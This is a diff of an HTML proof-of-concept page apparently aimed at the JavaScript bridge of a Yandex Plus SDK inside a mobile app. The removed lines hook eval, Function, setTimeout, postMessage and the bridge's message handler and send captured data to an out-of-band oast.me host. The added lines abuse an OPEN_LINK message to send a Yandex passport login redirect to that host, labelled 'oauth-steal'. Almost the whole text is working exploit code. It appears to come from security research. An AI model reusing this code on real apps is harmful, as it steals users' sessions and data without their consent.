@@ -1,84 +1,25 @@
 <html><head><title>PoC</title></head>
 <body>
 <script>
-// Hook ALL possible ways native can send response back to page
-var captured = [];
+// CRITICAL ATTACK: Use OPEN_LINK to open Yandex OAuth auth endpoint
+// with retpath pointing to our server. If user is already logged in,
+// Yandex will redirect back to our server WITH the session/token.
+//
+// passport.yandex.ru/auth?retpath=URL redirects to URL after auth
+// If user is already authenticated, it redirects immediately with cookies
 
-// Hook eval
-var origEval = window.eval;
-window.eval = function(code) {
-  captured.push({method:"eval", code:String(code).substring(0,2000)});
-  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bank-eval?" + encodeURIComponent(String(code).substring(0,2000)));
-  return origEval.call(window, code);
-};
-
-// Hook Function constructor
-var origFunction = Function;
-window.Function = function() {
-  var args = Array.from(arguments);
-  captured.push({method:"Function", args:JSON.stringify(args).substring(0,2000)});
-  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bank-function?" + encodeURIComponent(JSON.stringify(args).substring(0,2000)));
-  return origFunction.apply(this, arguments);
-};
-
-// Hook setTimeout/setInterval with string args
-var origSetTimeout = window.setTimeout;
-window.setTimeout = function(fn) {
-  if (typeof fn === 'string') {
-    captured.push({method:"setTimeout", code:fn.substring(0,2000)});
-    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bank-timeout?" + encodeURIComponent(fn.substring(0,2000)));
-  }
-  return origSetTimeout.apply(window, arguments);
-};
-
-// Monitor script injections
-var obs = new MutationObserver(function(mutations) {
-  mutations.forEach(function(m) {
-    m.addedNodes.forEach(function(n) {
-      if (n.tagName === 'SCRIPT') {
-        var content = n.src || n.textContent;
-        captured.push({method:"script-inject", content:String(content).substring(0,2000)});
-        fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bank-script?" + encodeURIComponent(String(content).substring(0,2000)));
-      }
-    });
-  });
-});
-obs.observe(document.documentElement, {childList:true, subtree:true});
-
-// Listen for postMessage
-window.addEventListener("message", function(e) {
-  captured.push({method:"postMessage", data:JSON.stringify(e.data).substring(0,2000)});
-  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bank-postmsg?" + encodeURIComponent(JSON.stringify(e.data).substring(0,2000)));
-});
-
-// Override __plusSDKMobileCompat.onMessage to catch incoming
-var origOnMsg = window.__plusSDKMobileCompat.onMessage;
-Object.defineProperty(window.__plusSDKMobileCompat, 'onMessage', {
-  set: function(fn) {
-    origOnMsg = fn;
-  },
-  get: function() {
-    return function(data) {
-      captured.push({method:"onMessage-incoming", data:String(data).substring(0,2000)});
-      fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bank-incoming?" + encodeURIComponent(String(data).substring(0,2000)));
-      if (origOnMsg) origOnMsg(data);
-    };
-  }
-});
-
-// NOW send BANK_STATE_REQUEST
 window.__plusSDKMobileCompat.onMessage(JSON.stringify({
-  type: "BANK_STATE_REQUEST",
-  trackId: "bank1",
-  payload: {}
+  type: "OPEN_LINK",
+  trackId: "oauth-steal",
+  payload: {
+    url: "https://passport.yandex.ru/auth?retpath=https%3A%2F%2Fda7db8p9tmut9738sbb0r4setdbsf769t.oast.me%2Foauth-redirect",
+    urlType: "WEBLINK",
+    openType: "OUT",
+    needAuth: false
+  }
 }));
 
-fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bank-state-sent");
-
-// Report after 8s
-setTimeout(function(){
-  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bank-captured?" + encodeURIComponent(JSON.stringify(captured)));
-}, 8000);
+fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/oauth-attack-sent");
 </script>
 </body>
 </html>
